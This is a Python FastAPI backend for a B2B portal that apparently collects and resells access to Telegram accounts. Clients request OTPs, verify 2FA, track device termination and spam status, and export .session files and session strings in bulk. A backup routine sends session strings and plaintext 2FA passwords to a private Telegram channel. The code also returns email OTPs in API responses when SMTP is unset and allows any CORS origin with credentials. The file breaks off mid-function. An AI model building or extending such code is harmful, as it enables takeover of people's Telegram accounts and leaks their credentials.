```python
"""
Client Portal Backend Server (B2B SaaS Telegram API Provider Panel)
===================================================================
Architecture:
- Standalone FastAPI Server + Supabase / PostgreSQL (asyncpg)
- Communicates with Main Server via HTTP (Admin, Internal & Public APIs)
- No wallet/balance logic; focused on Account Collection, Analytics & Exports

Features:
1. Client Auth: Registration, 6-Digit Email Verification (SMTP + Fallback), JWT Login
2. Multi-Endpoint Management: Create & update multiple endpoints per client
   (2FA Accept/Reject, Bot Token, Admin TG ID, Profile Pic URL, Default Webhook)
3. Analytics & Insights: Account Status Breakdown, Country Leaderboard, Proxy Metrics
4. Request Logs: Detailed tracking of OTP requests, 2FA, Proxy usage, and Exports
5. Account Management & Exports: Single (.session, .json, string) & Bulk ZIP Exports
6. Secure Telegram Channel Backup: Sends .session + client/account JSON metadata
   to a private Telegram channel BEFORE deleting from the database.
7. Live API Sandbox Proxy: Test OTP Request, Verify OTP, Verify 2FA, Cancel Session
"""

import asyncio
import io
import json
import logging
import os
import random
import re
import smtplib
import uuid
import zipfile
from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Any, Dict, List, Optional

import asyncpg
import httpx
import jwt
from dotenv import load_dotenv
from fastapi import Depends, FastAPI, Header, HTTPException, Query, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, PlainTextResponse, StreamingResponse
from passlib.context import CryptContext
from pydantic import BaseModel, Field, validator

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [ClientPortal] - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════════
#  ENVIRONMENT VARIABLES (Configure in .env for Supabase & Main API)
# ══════════════════════════════════════════════════════════════════

# 1. Supabase / PostgreSQL Database for Client Portal
PORTAL_DATABASE_URL = os.getenv(
    "PORTAL_DATABASE_URL",
    os.getenv("DATABASE_URL", "postgresql://postgres:password@localhost:5432/client_portal_db"),
)

# Optional: Direct Main Server DB URL if hard-delete from telegram_sessions is desired
MAIN_DATABASE_URL = os.getenv("MAIN_DATABASE_URL", "")

# 2. Main Server Connection Credentials
MAIN_SERVER_URL = os.getenv("MAIN_SERVER_URL", "http://localhost:8000").rstrip("/")
MAIN_SERVER_ADMIN_KEY = os.getenv("MAIN_SERVER_ADMIN_KEY", "")       # Matches ADMIN_API_KEY on Main Server
MAIN_SERVER_INTERNAL_KEY = os.getenv("MAIN_SERVER_INTERNAL_KEY", "") # Matches ADMIN_PANEL_INTERNAL_KEY on Main Server
MAIN_SERVER_API_KEY = os.getenv("MAIN_SERVER_API_KEY", "")           # Matches API_KEY on Main Server

# 3. JWT Security Configuration
JWT_SECRET = os.getenv("JWT_SECRET", "change-this-super-secret-jwt-key-in-production")
JWT_ALGORITHM = "HS256"
JWT_EXPIRATION_HOURS = int(os.getenv("JWT_EXPIRATION_HOURS", "72"))

# 4. SMTP Email Verification Settings
SMTP_HOST = os.getenv("SMTP_HOST", "")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
SMTP_USER = os.getenv("SMTP_USER", "")
SMTP_PASS = os.getenv("SMTP_PASS", "")
SMTP_FROM = os.getenv("SMTP_FROM", "noreply@tgauthportal.com")
REQUIRE_EMAIL_VERIFICATION = os.getenv("REQUIRE_EMAIL_VERIFICATION", "true").lower() == "true"

# 5. Private Telegram Channel for Session Backup (Before Delete / Archive)
BACKUP_BOT_TOKEN = os.getenv("BACKUP_BOT_TOKEN", "")
BACKUP_CHAT_ID = os.getenv("BACKUP_CHAT_ID", "")  # e.g., "-100192837465"

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")


# ══════════════════════════════════════════════════════════════════
#  PYDANTIC DATA MODELS & SCHEMAS
# ══════════════════════════════════════════════════════════════════

class ClientRegisterRequest(BaseModel):
    name: str = Field(..., min_length=2, max_length=100)
    email: str = Field(..., description="Client business or developer email")
    password: str = Field(..., min_length=6, max_length=128)
    company_name: Optional[str] = Field(None, max_length=150)
    telegram_username: Optional[str] = Field(None, max_length=100)

    @validator("email")
    def validate_email(cls, v: str) -> str:
        v = v.strip().lower()
        if not re.match(r"^[\w\.\+\-]+@[\w\.\-]+\.\w{2,}$", v):
            raise ValueError("Invalid email address format")
        return v


class VerifyEmailRequest(BaseModel):
    email: str
    otp_code: str = Field(..., min_length=6, max_length=6)


class ResendVerificationRequest(BaseModel):
    email: str


class ClientLoginRequest(BaseModel):
    email: str
    password: str


class EndpointConfigureRequest(BaseModel):
    endpoint_name: str = Field(..., min_length=3, max_length=50, description="Unique identifier like 'my_app_1'")
    display_name: Optional[str] = Field(None, max_length=100, description="Friendly project name")
    accept_2fa: bool = Field(False, description="Accept accounts with 2FA enabled")
    reject_2fa: bool = Field(False, description="Reject accounts with 2FA enabled")
    bot_token: Optional[str] = Field(None, description="Telegram Bot Token for notifications")
    admin_telegram_id: Optional[int] = Field(None, description="Client Admin Telegram Chat ID")
    default_webhook_url: Optional[str] = Field(None, description="Webhook URL to receive completed accounts")
    profile_pic_url: Optional[str] = Field(None, description="Custom profile picture URL to set on processed accounts")

    @validator("endpoint_name")
    def validate_endpoint_name(cls, v: str) -> str:
        v = v.strip().lower()
        if not re.match(r"^[a-z0-9_-]+$", v):
            raise ValueError("Endpoint name can only contain lowercase letters, numbers, underscores, and hyphens")
        if v in ("default", "admin", "internal", "system"):
            raise ValueError("This endpoint name is reserved")
        return v

    @validator("default_webhook_url", "profile_pic_url")
    def validate_urls(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return None
        v = v.strip()
        if not v:
            return None
        if not v.startswith(("http://", "https://")):
            raise ValueError("URL must start with http:// or https://")
        return v


class EndpointUpdateRequest(BaseModel):
    display_name: Optional[str] = Field(None, max_length=100)
    accept_2fa: bool = Field(False)
    reject_2fa: bool = Field(False)
    bot_token: Optional[str] = None
    admin_telegram_id: Optional[int] = None
    default_webhook_url: Optional[str] = None
    profile_pic_url: Optional[str] = None

    @validator("default_webhook_url", "profile_pic_url")
    def validate_urls(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return None
        v = v.strip()
        if not v:
            return None
        if not v.startswith(("http://", "https://")):
            raise ValueError("URL must start with http:// or https://")
        return v


class SandboxOTPRequest(BaseModel):
    endpoint_name: str
    phone_number: str
    use_proxy: bool = True
    country_code: Optional[str] = None
    user_identifier: Optional[str] = "sandbox_tester"
    user_identifier_type: Optional[str] = "sandbox"
    timeout_seconds: Optional[int] = 300


class SandboxVerifyOTPRequest(BaseModel):
    endpoint_name: str
    session_id: str
    otp_code: str = Field(..., min_length=5, max_length=5)


class SandboxVerify2FARequest(BaseModel):
    endpoint_name: str
    session_id: str
    password: str = Field(..., min_length=1)


class SandboxCancelRequest(BaseModel):
    endpoint_name: str
    session_id: str
    reason: Optional[str] = "Cancelled from portal sandbox"


class BulkSessionActionRequest(BaseModel):
    session_ids: List[str] = Field(..., min_items=1, max_items=100)


# ══════════════════════════════════════════════════════════════════
#  SUPABASE / POSTGRESQL DATABASE MANAGER
# ══════════════════════════════════════════════════════════════════

class PortalDatabase:
    def __init__(self):
        self.pool: Optional[asyncpg.Pool] = None
        self.main_db_pool: Optional[asyncpg.Pool] = None

    async def init_pools(self):
        """Initialize connection pool to Supabase / PostgreSQL (and optional Main DB)"""
        self.pool = await asyncpg.create_pool(
            PORTAL_DATABASE_URL,
            min_size=2,
            max_size=15,
            command_timeout=60,
            statement_cache_size=0,  # Required for Supabase PgBouncer transaction mode
        )
        if MAIN_DATABASE_URL:
            try:
                self.main_db_pool = await asyncpg.create_pool(
                    MAIN_DATABASE_URL,
                    min_size=1,
                    max_size=5,
                    command_timeout=30,
                    statement_cache_size=0,
                )
                logger.info("✅ Connected to Main Server Database for direct cleanup after backup")
            except Exception as e:
                logger.warning(f"⚠️ Could not connect to MAIN_DATABASE_URL (will use soft-delete tracking): {e}")

        await self.create_tables()
        logger.info("✅ Client Portal Supabase/PostgreSQL tables initialized")

    async def create_tables(self):
        async with self.pool.acquire() as conn:
            # 1. Clients Table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS portal_clients (
                    id SERIAL PRIMARY KEY,
                    uuid UUID DEFAULT gen_random_uuid() UNIQUE,
                    name VARCHAR(100) NOT NULL,
                    email VARCHAR(255) UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    company_name VARCHAR(150),
                    telegram_username VARCHAR(100),
                    is_email_verified BOOLEAN DEFAULT FALSE,
                    is_active BOOLEAN DEFAULT TRUE,
                    last_login_at TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # 2. Email Verification OTPs Table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS portal_email_verifications (
                    id SERIAL PRIMARY KEY,
                    client_id INTEGER REFERENCES portal_clients(id) ON DELETE CASCADE,
                    email VARCHAR(255) NOT NULL,
                    otp_code VARCHAR(10) NOT NULL,
                    expires_at TIMESTAMP NOT NULL,
                    is_used BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # 3. Client Endpoints Table (Multiple endpoints per client)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS portal_endpoints (
                    id SERIAL PRIMARY KEY,
                    client_id INTEGER REFERENCES portal_clients(id) ON DELETE CASCADE,
                    endpoint_name VARCHAR(100) UNIQUE NOT NULL,
                    display_name VARCHAR(100),
                    client_api_key VARCHAR(255) UNIQUE NOT NULL,
                    accept_2fa BOOLEAN DEFAULT FALSE,
                    reject_2fa BOOLEAN DEFAULT FALSE,
                    bot_token TEXT,
                    admin_telegram_id BIGINT,
                    default_webhook_url TEXT,
                    profile_pic_url TEXT,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # 4. Request & Proxy Usage Logs Table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS portal_request_logs (
                    id SERIAL PRIMARY KEY,
                    client_id INTEGER REFERENCES portal_clients(id) ON DELETE CASCADE,
                    endpoint_name VARCHAR(100) NOT NULL,
                    session_id VARCHAR(64),
                    action VARCHAR(50) NOT NULL,
                    phone_number VARCHAR(30),
                    country_code VARCHAR(10),
                    proxy_used BOOLEAN DEFAULT FALSE,
                    status VARCHAR(30) DEFAULT 'pending',
                    response_code INTEGER DEFAULT 200,
                    error_message TEXT,
                    ip_address VARCHAR(64),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # 5. Account Backups & Deletion Registry Table
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS portal_account_backups (
                    id SERIAL PRIMARY KEY,
                    session_id VARCHAR(64) UNIQUE NOT NULL,
                    client_id INTEGER REFERENCES portal_clients(id) ON DELETE SET NULL,
                    endpoint_name VARCHAR(100) NOT NULL,
                    phone_number VARCHAR(30),
                    country_code VARCHAR(10),
                    spam_status VARCHAR(50),
                    telegram_backed_up BOOLEAN DEFAULT FALSE,
                    deleted_from_main BOOLEAN DEFAULT FALSE,
                    backed_up_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)

            # Helpful Indexes
            await conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_portal_endpoints_client ON portal_endpoints(client_id);
                CREATE INDEX IF NOT EXISTS idx_portal_logs_client_ep ON portal_request_logs(client_id, endpoint_name, created_at DESC);
                CREATE INDEX IF NOT EXISTS idx_portal_backups_ep ON portal_account_backups(endpoint_name, session_id);
            """)

    async def log_request(
        self,
        client_id: int,
        endpoint_name: str,
        action: str,
        session_id: Optional[str] = None,
        phone_number: Optional[str] = None,
        country_code: Optional[str] = None,
        proxy_used: bool = False,
        status: str = "success",
        response_code: int = 200,
        error_message: Optional[str] = None,
        ip_address: Optional[str] = None,
    ):
        try:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO portal_request_logs
                    (client_id, endpoint_name, session_id, action, phone_number, country_code,
                     proxy_used, status, response_code, error_message, ip_address)
                    VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
                    """,
                    client_id,
                    endpoint_name,
                    session_id,
                    action,
                    phone_number,
                    country_code,
                    proxy_used,
                    status,
                    response_code,
                    error_message,
                    ip_address,
                )
        except Exception as e:
            logger.warning(f"⚠️ Failed to write request log: {e}")

    async def close(self):
        if self.pool:
            await self.pool.close()
        if self.main_db_pool:
            await self.main_db_pool.close()


db = PortalDatabase()


# ══════════════════════════════════════════════════════════════════
#  EMAIL VERIFICATION & PRIVATE TELEGRAM BACKUP HELPERS
# ══════════════════════════════════════════════════════════════════

async def send_verification_email(to_email: str, client_name: str, otp_code: str) -> bool:
    """Sends a 6-digit verification email via SMTP. Falls back to console log if SMTP is not set."""
    if not SMTP_HOST or not SMTP_USER or not SMTP_PASS:
        logger.info(f"📧 [DEV MODE - NO SMTP] Verification OTP for {to_email}: {otp_code}")
        return False

    subject = f"{otp_code} is your TgAuth Developer Portal verification code"
    html_body = f"""
    <div style="font-family: Arial, sans-serif; max-width: 520px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px;">
        <h2 style="color: #0f172a; margin-top: 0;">Verify Your Developer Account</h2>
        <p style="color: #475569;">Hello <b>{client_name}</b>,</p>
        <p style="color: #475569;">Use the following 6-digit verification code to activate your TgAuth API Portal account:</p>
        <div style="background: #f1f5f9; border-radius: 8px; padding: 16px; text-align: center; font-size: 28px; font-weight: bold; letter-spacing: 6px; color: #2563eb; margin: 20px 0;">
            {otp_code}
        </div>
        <p style="color: #64748b; font-size: 13px;">This code will expire in 15 minutes.</p>
    </div>
    """

    def _send_sync():
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = SMTP_FROM
        msg["To"] = to_email
        msg.attach(MIMEText(html_body, "html"))

        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=15) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASS)
            server.sendmail(SMTP_FROM, [to_email], msg.as_string())

    try:
        await asyncio.to_thread(_send_sync)
        logger.info(f"✅ Verification email sent to {to_email}")
        return True
    except Exception as e:
        logger.error(f"❌ Failed to send verification email to {to_email}: {e}")
        return False


async def backup_session_to_telegram_channel(
    session_data: Dict[str, Any],
    client_info: Dict[str, Any],
    reason: str = "before_delete",
) -> bool:
    """
    Packages the .session string and full JSON metadata (Session Details + Client Details)
    into a ZIP archive and uploads it to the Admin's Private Telegram Channel BEFORE deletion.
    Returns True if successfully sent.
    """
    if not BACKUP_BOT_TOKEN or not BACKUP_CHAT_ID:
        logger.warning("⚠️ BACKUP_BOT_TOKEN or BACKUP_CHAT_ID not configured! Cannot backup to Telegram.")
        return False

    session_id = str(session_data.get("session_id", "unknown"))
    phone = str(session_data.get("phone_number", "unknown")).replace("+", "").strip()
    session_string = session_data.get("session_string") or ""
    two_fa_password = session_data.get("new_password") or session_data.get("two_fa_password") or "N/A"
    country_code = session_data.get("country_code") or "N/A"
    spam_status = session_data.get("spam_status") or "unknown"
    endpoint_name = session_data.get("endpoint_name") or "unknown"

    # Build comprehensive backup metadata JSON
    backup_metadata = {
        "backup_timestamp": datetime.utcnow().isoformat() + "Z",
        "backup_reason": reason,
        "client_details": {
            "client_id": client_info.get("id"),
            "client_uuid": str(client_info.get("uuid", "")),
            "name": client_info.get("name"),
            "email": client_info.get("email"),
            "company_name": client_info.get("company_name"),
            "telegram_username": client_info.get("telegram_username"),
            "endpoint_name": endpoint_name,
        },
        "session_details": {
            "session_id": session_id,
            "phone_number": session_data.get("phone_number"),
            "user_id": session_data.get("user_id"),
            "username": session_data.get("username"),
            "first_name": session_data.get("first_name"),
            "last_name": session_data.get("last_name"),
            "country_code": country_code,
            "country_name": session_data.get("country_name"),
            "spam_status": spam_status,
            "device_termination_status": session_data.get("device_termination_status"),
            "two_fa_password": two_fa_password,
            "is_premium": session_data.get("is_premium", False),
            "is_verified": session_data.get("is_verified", False),
            "account_age_days": session_data.get("account_age_days"),
            "session_string": session_string,
            "created_at": str(session_data.get("created_at", "")),
        },
    }

    # Create in-memory ZIP containing {phone}.session, {phone}.session.txt, and {phone}_details.json
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{phone}.session", session_string)
        zf.writestr(f"{phone}.session.txt", session_string)
        zf.writestr(f"{phone}_details.json", json.dumps(backup_metadata, indent=2, ensure_ascii=False))
    zip_buffer.seek(0)

    caption = (
        f"📦 <b>Account Session Backup ({reason.upper()})</b>\n\n"
        f"📱 <b>Phone:</b> <code>{session_data.get('phone_number', 'N/A')}</code>\n"
        f"🌍 <b>Country:</b> <code>{country_code}</code> | 🛡️ <b>Spam:</b> <code>{spam_status}</code>\n"
        f"🔑 <b>2FA Password:</b> <code>{two_fa_password}</code>\n"
        f"👤 <b>TG User:</b> @{session_data.get('username') or 'N/A'} (ID: <code>{session_data.get('user_id') or 'N/A'}</code>)\n"
        f"────────────────────\n"
        f"🏢 <b>Client:</b> {client_info.get('name')} ({client_info.get('email')})\n"
        f"🔌 <b>Endpoint:</b> <code>{endpoint_name}</code>\n"
        f"🆔 <b>Session ID:</b> <code>{session_id}</code>"
    )

    try:
        async with httpx.AsyncClient(timeout=30.0) as http:
            files = {
                "document": (f"backup_{phone}_{session_id[:8]}.zip", zip_buffer.getvalue(), "application/zip")
            }
            data = {
                "chat_id": BACKUP_CHAT_ID,
                "caption": caption,
                "parse_mode": "HTML",
            }
            resp = await http.post(
                f"https://api.telegram.org/bot{BACKUP_BOT_TOKEN}/sendDocument",
                data=data,
                files=files,
            )
            if resp.status_code == 200:
                logger.info(f"✅ Telegram channel backup succeeded for {phone} ({session_id})")
                return True
            else:
                logger.error(f"❌ Telegram backup HTTP {resp.status_code}: {resp.text[:200]}")
                return False
    except Exception as e:
        logger.error(f"❌ Telegram backup exception for {session_id}: {e}")
        return False


# ══════════════════════════════════════════════════════════════════
#  FASTAPI APPLICATION & AUTH DEPENDENCY
# ══════════════════════════════════════════════════════════════════

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("🚀 Starting Client Portal Backend Server...")
    await db.init_pools()
    yield
    logger.info("🛑 Shutting down Client Portal Backend Server...")
    await db.close()


app = FastAPI(
    title="TgAuth Client Developer Portal API",
    description="B2B SaaS Portal Server for Self-Service Endpoint Management, Analytics, Logs & Exports",
    version="4.0.0",
    lifespan=lifespan,
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def create_jwt_token(client_id: int, email: str) -> str:
    payload = {
        "client_id": client_id,
        "email": email,
        "exp": datetime.utcnow() + timedelta(hours=JWT_EXPIRATION_HOURS),
        "iat": datetime.utcnow(),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)


async def get_current_client(authorization: Optional[str] = Header(None)) -> Dict[str, Any]:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or invalid Bearer token")

    token = authorization.split(" ", 1)[1].strip()
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        client_id = payload.get("client_id")
        if not client_id:
            raise HTTPException(status_code=401, detail="Invalid token payload")

        async with db.pool.acquire() as conn:
            row = await conn.fetchrow(
                "SELECT * FROM portal_clients WHERE id = $1 AND is_active = TRUE",
                client_id,
            )
            if not row:
                raise HTTPException(status_code=401, detail="Account not found or suspended")
            client = dict(row)
            if REQUIRE_EMAIL_VERIFICATION and not client.get("is_email_verified"):
                raise HTTPException(status_code=403, detail="Email not verified. Please verify your email first.")
            return client
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Session expired. Please sign in again.")
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid authentication token")


async def verify_endpoint_ownership(client_id: int, endpoint_name: str) -> Dict[str, Any]:
    """Ensures the requested endpoint belongs to the logged-in client."""
    async with db.pool.acquire() as conn:
        row = await conn.fetchrow(
            "SELECT * FROM portal_endpoints WHERE client_id = $1 AND endpoint_name = $2 AND is_active = TRUE",
            client_id,
            endpoint_name.strip().lower(),
        )
        if not row:
            raise HTTPException(
                status_code=403,
                detail=f"You do not have permission to access endpoint '{endpoint_name}'",
            )
        return dict(row)


# ══════════════════════════════════════════════════════════════════
#  1. CLIENT AUTHENTICATION & EMAIL VERIFICATION ROUTES
# ══════════════════════════════════════════════════════════════════

@app.post("/api/auth/register")
async def register_client(req: ClientRegisterRequest):
    async with db.pool.acquire() as conn:
        existing = await conn.fetchrow("SELECT id FROM portal_clients WHERE email = $1", req.email)
        if existing:
            raise HTTPException(status_code=409, detail="An account with this email already exists")

        password_hash = pwd_context.hash(req.password)
        is_auto_verified = not REQUIRE_EMAIL_VERIFICATION

        client_row = await conn.fetchrow(
            """
            INSERT INTO portal_clients
            (name, email, password_hash, company_name, telegram_username, is_email_verified)
            VALUES ($1, $2, $3, $4, $5, $6)
            RETURNING id, uuid, name, email, company_name, telegram_username, is_email_verified, created_at
            """,
            req.name.strip(),
            req.email,
            password_hash,
            req.company_name,
            req.telegram_username,
            is_auto_verified,
        )
        client = dict(client_row)

        # Generate 6-digit Email Verification Code
        otp_code = f"{random.randint(100000, 999999)}"
        expires_at = datetime.utcnow() + timedelta(minutes=15)
        await conn.execute(
            """
            INSERT INTO portal_email_verifications (client_id, email, otp_code, expires_at)
            VALUES ($1, $2, $3, $4)
            """,
            client["id"],
            req.email,
            otp_code,
            expires_at,
        )

    email_sent = await send_verification_email(req.email, req.name, otp_code)

    response_data: Dict[str, Any] = {
        "success": True,
        "requires_verification": REQUIRE_EMAIL_VERIFICATION,
        "email_sent": email_sent,
        "message": (
            "Registration successful! Please check your email for the 6-digit verification code."
            if REQUIRE_EMAIL_VERIFICATION
            else "Registration successful!"
        ),
        "client": {
            "id": client["id"],
            "uuid": str(client["uuid"]),
            "name": client["name"],
            "email": client["email"],
            "company_name": client["company_name"],
            "is_email_verified": client["is_email_verified"],
        },
    }

    # If SMTP is not configured in dev environment, provide a dev hint so testing isn't blocked
    if not email_sent and REQUIRE_EMAIL_VERIFICATION:
        response_data["dev_otp_hint"] = otp_code
        response_data["message"] = f"SMTP not configured. Use verification code: {otp_code}"

    if not REQUIRE_EMAIL_VERIFICATION:
        response_data["token"] = create_jwt_token(client["id"], client["email"])

    return response_data


@app.post("/api/auth/verify-email")
async def verify_email(req: VerifyEmailRequest):
    email = req.email.strip().lower()
    async with db.pool.acquire() as conn:
        client = await conn.fetchrow("SELECT * FROM portal_clients WHERE email = $1", email)
        if not client:
            raise HTTPException(status_code=404, detail="Account not found")

        if client["is_email_verified"]:
            token = create_jwt_token(client["id"], client["email"])
            return {"success": True, "message": "Email already verified", "token": token}

        otp_row = await conn.fetchrow(
            """
            SELECT * FROM portal_email_verifications
            WHERE client_id = $1 AND otp_code = $2 AND is_used = FALSE
            ORDER BY created_at DESC LIMIT 1
            """,
            client["id"],
            req.otp_code.strip(),
        )

        if not otp_row:
            raise HTTPException(status_code=400, detail="Invalid verification code")

        if datetime.utcnow() > otp_row["expires_at"]:
            raise HTTPException(status_code=400, detail="Verification code has expired. Please request a new one.")

        await conn.execute("UPDATE portal_email_verifications SET is_used = TRUE WHERE id = $1", otp_row["id"])
        await conn.execute(
            "UPDATE portal_clients SET is_email_verified = TRUE, updated_at = CURRENT_TIMESTAMP WHERE id = $1",
            client["id"],
        )

    token = create_jwt_token(client["id"], client["email"])
    return {
        "success": True,
        "message": "Email verified successfully! Welcome to the Developer Portal.",
        "token": token,
        "client": {
            "id": client["id"],
            "uuid": str(client["uuid"]),
            "name": client["name"],
            "email": client["email"],
            "company_name": client["company_name"],
            "is_email_verified": True,
        },
    }


@app.post("/api/auth/resend-verification")
async def resend_verification(req: ResendVerificationRequest):
    email = req.email.strip().lower()
    async with db.pool.acquire() as conn:
        client = await conn.fetchrow("SELECT * FROM portal_clients WHERE email = $1", email)
        if not client:
            raise HTTPException(status_code=404, detail="Account not found")
        if client["is_email_verified"]:
            return {"success": True, "message": "Email is already verified"}

        otp_code = f"{random.randint(100000, 999999)}"
        expires_at = datetime.utcnow() + timedelta(minutes=15)
        await conn.execute(
            """
            INSERT INTO portal_email_verifications (client_id, email, otp_code, expires_at)
            VALUES ($1, $2, $3, $4)
            """,
            client["id"],
            email,
            otp_code,
            expires_at,
        )

    email_sent = await send_verification_email(email, client["name"], otp_code)
    resp = {"success": True, "message": "Verification code sent to your email", "email_sent": email_sent}
    if not email_sent:
        resp["dev_otp_hint"] = otp_code
    return resp


@app.post("/api/auth/login")
async def login_client(req: ClientLoginRequest):
    email = req.email.strip().lower()
    async with db.pool.acquire() as conn:
        client = await conn.fetchrow("SELECT * FROM portal_clients WHERE email = $1", email)
        if not client or not pwd_context.verify(req.password, client["password_hash"]):
            raise HTTPException(status_code=401, detail="Invalid email or password")

        if not client["is_active"]:
            raise HTTPException(status_code=403, detail="Your account has been suspended. Contact administrator.")

        if REQUIRE_EMAIL_VERIFICATION and not client["is_email_verified"]:
            raise HTTPException(
                status_code=403,
                detail="EMAIL_NOT_VERIFIED",
            )

        await conn.execute(
            "UPDATE portal_clients SET last_login_at = CURRENT_TIMESTAMP WHERE id = $1",
            client["id"],
        )

        endpoints = await conn.fetch(
            "SELECT * FROM portal_endpoints WHERE client_id = $1 AND is_active = TRUE ORDER BY created_at ASC",
            client["id"],
        )

    token = create_jwt_token(client["id"], client["email"])
    return {
        "success": True,
        "token": token,
        "client": {
            "id": client["id"],
            "uuid": str(client["uuid"]),
            "name": client["name"],
            "email": client["email"],
            "company_name": client["company_name"],
            "telegram_username": client["telegram_username"],
            "is_email_verified": client["is_email_verified"],
        },
        "endpoints": [dict(e) for e in endpoints],
    }


@app.get("/api/auth/me")
async def get_my_profile(client: Dict[str, Any] = Depends(get_current_client)):
    async with db.pool.acquire() as conn:
        endpoints = await conn.fetch(
            "SELECT * FROM portal_endpoints WHERE client_id = $1 AND is_active = TRUE ORDER BY created_at ASC",
            client["id"],
        )
    return {
        "success": True,
        "client": {
            "id": client["id"],
            "uuid": str(client["uuid"]),
            "name": client["name"],
            "email": client["email"],
            "company_name": client["company_name"],
            "telegram_username": client["telegram_username"],
            "created_at": client["created_at"].isoformat() if client.get("created_at") else None,
        },
        "endpoints": [dict(e) for e in endpoints],
    }


# ══════════════════════════════════════════════════════════════════
#  2. MULTI-ENDPOINT CONFIGURATION (SYNCS WITH MAIN SERVER)
# ══════════════════════════════════════════════════════════════════

@app.get("/api/client/endpoints")
async def list_client_endpoints(client: Dict[str, Any] = Depends(get_current_client)):
    async with db.pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT * FROM portal_endpoints WHERE client_id = $1 AND is_active = TRUE ORDER BY created_at ASC",
            client["id"],
        )
    return {"success": True, "total": len(rows), "endpoints": [dict(r) for r in rows]}


@app.post("/api/client/endpoints")
async def create_client_endpoint(
    req: EndpointConfigureRequest,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    Creates a new endpoint for the client and registers it on the Main Server
    via /admin/configure-endpoint to generate an official `epk_...` API Key.
    """
    if req.accept_2fa and req.reject_2fa:
        raise HTTPException(status_code=400, detail="Cannot enable both accept_2fa and reject_2fa simultaneously")

    async with db.pool.acquire() as conn:
        existing = await conn.fetchrow(
            "SELECT client_id FROM portal_endpoints WHERE endpoint_name = $1",
            req.endpoint_name,
        )
        if existing:
            raise HTTPException(
                status_code=409,
                detail=f"Endpoint name '{req.endpoint_name}' is already taken. Choose another identifier.",
            )

    # Sync with Main Server /admin/configure-endpoint
    api_key = None
    try:
        async with httpx.AsyncClient(timeout=20.0) as http:
            resp = await http.post(
                f"{MAIN_SERVER_URL}/admin/configure-endpoint",
                json={
                    "endpoint_name": req.endpoint_name,
                    "accept_2fa": req.accept_2fa,
                    "reject_2fa": req.reject_2fa,
                    "bot_token": req.bot_token,
                    "admin_telegram_id": req.admin_telegram_id,
                    "default_webhook_url": req.default_webhook_url,
                    "profile_pic_url": req.profile_pic_url,
                },
                headers={"X-Admin-Key": MAIN_SERVER_ADMIN_KEY},
            )
            if resp.status_code != 200:
                raise HTTPException(
                    status_code=502,
                    detail=f"Main Server rejected endpoint configuration: {resp.text[:200]}",
                )
            main_data = resp.json().get("data") or {}
            api_key = main_data.get("api_key")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Could not reach Main Server to configure endpoint: {e}")
        raise HTTPException(status_code=502, detail=f"Failed to communicate with Main Server: {str(e)}")

    if not api_key:
        api_key = f"epk_{uuid.uuid4().hex}{uuid.uuid4().hex[:12]}"

    async with db.pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            INSERT INTO portal_endpoints
            (client_id, endpoint_name, display_name, client_api_key, accept_2fa, reject_2fa,
             bot_token, admin_telegram_id, default_webhook_url, profile_pic_url)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
            RETURNING *
            """,
            client["id"],
            req.endpoint_name,
            req.display_name or req.endpoint_name,
            api_key,
            req.accept_2fa,
            req.reject_2fa,
            req.bot_token,
            req.admin_telegram_id,
            req.default_webhook_url,
            req.profile_pic_url,
        )

    return {
        "success": True,
        "message": f"Endpoint '{req.endpoint_name}' created and synced with Main Server!",
        "endpoint": dict(row),
    }


@app.put("/api/client/endpoints/{endpoint_name}")
async def update_client_endpoint(
    endpoint_name: str,
    req: EndpointUpdateRequest,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
